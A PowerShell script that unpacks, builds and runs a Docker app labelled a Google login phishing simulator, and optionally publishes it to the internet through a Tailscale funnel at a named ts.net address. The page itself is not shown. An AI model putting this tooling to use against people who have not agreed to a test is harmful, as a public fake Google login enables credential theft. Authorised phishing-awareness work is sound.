# Google Login Phishing Simulator - Windows Docker Setup Script
# This script automates the entire setup process

Write-Host "================================"
Write-Host "Google Login Phishing Simulator"
Write-Host "Windows Docker Setup"
Write-Host "================================`n"

# Step 1: Download from Downloads folder
Write-Host "Step 1: Locating ZIP file from Downloads..."
$downloadsPath = "$env:USERPROFILE\Downloads"
$zipFile = Get-ChildItem -Path $downloadsPath -Filter "*ggl*.zip" | Select-Object -First 1

if (-not $zipFile) {
    Write-Host "ERROR: No ZIP file found in Downloads folder!"
    Write-Host "Expected a ZIP file named something like 'ggl-app.zip'"
    exit 1
}

Write-Host "✓ Found: $($zipFile.Name)`n"

# Step 2: Create project directory
Write-Host "Step 2: Creating project directory..."
$projectPath = "$env:USERPROFILE\Desktop\ggl-app"

if (Test-Path $projectPath) {
    Write-Host "Directory already exists at: $projectPath"
    $response = Read-Host "Do you want to replace it? (yes/no)"
    if ($response -ne "yes") {
        Write-Host "Setup cancelled."
        exit 1
    }
    Remove-Item -Path $projectPath -Recurse -Force
}

New-Item -ItemType Directory -Path $projectPath | Out-Null
Write-Host "✓ Created: $projectPath`n"

# Step 3: Extract ZIP
Write-Host "Step 3: Extracting ZIP file..."
try {
    Expand-Archive -Path $zipFile.FullName -DestinationPath $projectPath -Force
    Write-Host "✓ Extracted successfully`n"
} catch {
    Write-Host "ERROR: Failed to extract ZIP file"
    Write-Host $_.Exception.Message
    exit 1
}

# Step 4: Fix nested folder structure (if needed)
Write-Host "Step 4: Checking folder structure..."
cd $projectPath

# Check if there's a nested ggl folder
$nestedFolder = Get-ChildItem -Path "." -Directory -Filter "ggl" -ErrorAction SilentlyContinue

if ($nestedFolder) {
    Write-Host "Found nested folder structure, fixing..."
    
    # Move files from nested folder to current directory
    Get-ChildItem -Path ".\ggl" -Force | ForEach-Object {
        Move-Item -Path $_.FullName -Destination "." -Force
    }
    
    # Remove empty nested folder
    Remove-Item ".\ggl" -Force -Recurse
    Write-Host "✓ Structure fixed`n"
} else {
    Write-Host "✓ Structure is correct`n"
}

# Step 5: Verify files
Write-Host "Step 5: Verifying files..."
$requiredFiles = @("Dockerfile", "package.json", "vite.config.ts")
$allFound = $true

foreach ($file in $requiredFiles) {
    if (-not (Test-Path $file)) {
        Write-Host "✗ Missing: $file"
        $allFound = $false
    } else {
        Write-Host "✓ Found: $file"
    }
}

if (-not $allFound) {
    Write-Host "`nERROR: Some required files are missing!"
    exit 1
}

Write-Host ""

# Step 6: Docker setup
Write-Host "Step 6: Building Docker image..."
Write-Host "(This takes 1-2 minutes the first time)"

$dockerOutput = docker build -t ggl-app . 2>&1
if ($LASTEXITCODE -ne 0) {
    Write-Host "ERROR: Docker build failed!"
    Write-Host $dockerOutput
    exit 1
}

Write-Host "✓ Docker image built successfully`n"

# Step 7: Start container
Write-Host "Step 7: Starting Docker container..."
docker stop ggl-phish 2>$null
docker rm ggl-phish 2>$null

# Create data folder if it doesn't exist
if (-not (Test-Path ".\data")) {
    New-Item -ItemType Directory -Path ".\data" | Out-Null
}

docker run -d `
    --name ggl-phish `
    -p 5001:5001 `
    -v "$projectPath\data:/app/data" `
    ggl-app

if ($LASTEXITCODE -ne 0) {
    Write-Host "ERROR: Failed to start container!"
    exit 1
}

Start-Sleep -Seconds 3
Write-Host "✓ Container started`n"

# Step 8: Verify container is running
Write-Host "Step 8: Verifying container..."
$logs = docker logs ggl-phish
if ($logs -match "serving on port 5001") {
    Write-Host "✓ Container is running successfully`n"
} else {
    Write-Host "WARNING: Container status unclear. Check logs with: docker logs ggl-phish`n"
}

# Step 9: Setup Tailscale (optional)
Write-Host "Step 9: Setting up Tailscale funnel (optional)"
$setupTailscale = Read-Host "Do you want to set up Tailscale for remote access? (yes/no)"

if ($setupTailscale -eq "yes") {
    Write-Host "Setting up Tailscale..."
    & "C:\Program Files\Tailscale\tailscale.exe" funnel --bg --set-path=/ggl-app 5001
    Write-Host "✓ Tailscale configured`n"
}

# Step 10: Summary
Write-Host "================================"
Write-Host "SETUP COMPLETE!"
Write-Host "================================`n"

Write-Host "Access your app at:`n"
Write-Host "🔗 Local:    http://localhost:5001/ggl-app/"
Write-Host "🔗 Tailscale: https://chumbin.taila643f2.ts.net/ggl-app/`n"

Write-Host "Project folder: $projectPath`n"

Write-Host "Common commands:"
Write-Host "  docker logs ggl-phish          # View app logs"
Write-Host "  docker stop ggl-phish          # Stop the app"
Write-Host "  docker start ggl-phish         # Restart the app"
Write-Host "  docker rm -f ggl-phish         # Remove container"
Write-Host ""

# Open browser
Write-Host "Opening browser in 3 seconds..."
Start-Sleep -Seconds 3
Start-Process "http://localhost:5001/ggl-app/"

Write-Host "✓ Setup complete!"
